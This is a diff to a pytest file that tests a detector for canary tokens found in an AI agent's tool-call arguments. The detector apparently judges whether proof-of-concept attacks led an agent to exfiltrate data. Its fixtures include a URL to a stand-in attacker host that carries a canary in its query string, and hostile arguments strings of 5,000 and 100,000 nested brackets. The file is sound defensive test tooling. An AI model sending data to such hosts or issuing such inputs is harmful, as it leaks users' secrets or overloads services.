@@ -327,6 +327,16 @@ def test_pocs_reproduce_a_canary_sent_in_a_tool_call(tmp_path: Path) -> None:
         ([{"name": "canary_1", "arguments": "{}"}], "no canary here", []),
         ([{"name": "t", "arguments": None}, "junk"], "sent.", []),
         ([{"name": "t", "args": {"q": "CANARY-77"}}], "sent.", ["CANARY-77"]),
+        (
+            [
+                {
+                    "name": "t",
+                    "arguments": {"a": "CANARY-31", "b": ["CANARY-32", {"c": "CANARY-33"}]},
+                }
+            ],
+            "sent.",
+            ["CANARY-31", "CANARY-32", "CANARY-33"],  # in the order the call holds them
+        ),
         # A host or file name is not a canary; a canary in a URL's query still is.
         (
             [{"name": "t", "arguments": {"u": "https://canary12.attacker.example/?k=CANARY-77"}}],
@@ -631,8 +641,11 @@ def _deep(depth: int) -> list[Any]:
 @pytest.mark.parametrize(
     "call",
     [
-        # A hostile agent's arguments string: 5000 nested brackets (10 kB).
+        # A hostile agent's arguments string: 5000 nested brackets (10 kB). Python 3.11
+        # cannot decode it; 3.12 and later decode it and the walk must not recurse.
         {"name": "t", "arguments": "[" * 5000 + json.dumps(CANARY) + "]" * 5000},
+        # 100000 deep: no Python version decodes it, so it is read as plain text.
+        {"name": "t", "arguments": "[" * 100000 + json.dumps(CANARY) + "]" * 100000},
         # Arguments another adapter recorded already decoded, 3000 deep.
         {"tool": "t", "input": {"q": _deep(3000)}},
     ],
